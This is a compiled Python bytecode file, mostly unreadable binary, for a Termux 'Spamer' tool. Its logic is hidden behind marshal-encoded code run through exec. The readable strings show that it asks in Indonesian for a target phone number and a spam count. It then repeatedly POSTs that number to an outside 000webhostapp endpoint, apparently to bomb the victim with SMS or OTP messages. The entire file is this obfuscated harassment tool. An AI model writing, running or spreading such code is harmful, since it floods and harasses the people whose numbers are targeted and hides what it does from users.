B
    �Vt]E  �               @   s   d dl Z ee �d�� dS )�    Ns�  �               @   s�   d dl Z d dlZdd� Zed� e�d� ed� ed�Zed�Zed� y xee	e��D ]
Z
e�  qZW W n ek
r�   e�  Y nX ed� dS )	�    Nc              C   s"   t jddtid�j} tt| � d S )Nz0https://zpammers.000webhostapp.com/Spam/Spam.phpZNomer)�data)�requestsZpost�No�text�print�x)�r� r	   � �Spam	   s    r   Z'_______________________________________zfiglet Spamer | lolcatz'=======================================z[>] Nomer Target : z[>] Jumlah Spams : )r   �osr   r   �system�inputr   ZJu�range�intr   �ImportError�exitr	   r	   r	   r
   �<module>   s   
)�marshal�exec�loads� r   r   �!/storage/emulated/0/termux/spa.py�<module>   s   